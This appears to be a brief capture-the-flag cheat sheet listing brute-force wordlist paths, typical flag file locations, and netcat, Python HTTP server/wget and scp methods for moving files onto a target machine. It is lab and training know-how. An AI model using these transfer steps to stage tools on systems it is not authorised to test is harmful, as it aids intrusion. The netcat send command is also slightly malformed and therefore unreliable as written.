# Important paths

## Wordlists

* `Password Bruteforcing with rockyou.txt`: `/usr/share/wordlists/rockyou.txt`
* `Directory Bruteforcing`: `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

## Flag paths

Generally, the user and root flags will be found on this paths:
* `user.txt`: `/home/<user-name>/user.txt`
* `root.txt`: `/root/root.txt`

## Ways to send file from Local to Vulnerable machine

* Netcat (nc) or Ncat
  - Using the `nc` or `ncat` tool to transfer files over a network connection.
  - On the receiving (vulnerable) machine, start a listener: ``` nc -nlvp <port> > received_file ```
  - On the local machine, send the file: ``` nc <target IP> <port> <file_to_send> ```

* Python HTTP Server
  - Using Python's built-in HTTP server module to host the file.
  - On the local machine, navigate to the directory containing the file: ``` cd /path/to/file/ ```
  - Start the HTTP server: ``` python -m http.server <port> ```
  - On the vulnerable machine, use `wget` or `curl` to download the file: ``` wget <your_local_ip>:<port>/file_to_download ```

* SCP (Secure Copy)
  - Using the `scp` command to securely transfer files over SSH.
  - On the local machine, use `scp` to copy the file to the vulnerable machine: ``` scp /path/to/file user@<target IP>:/path/on/vulnerable/machine ```
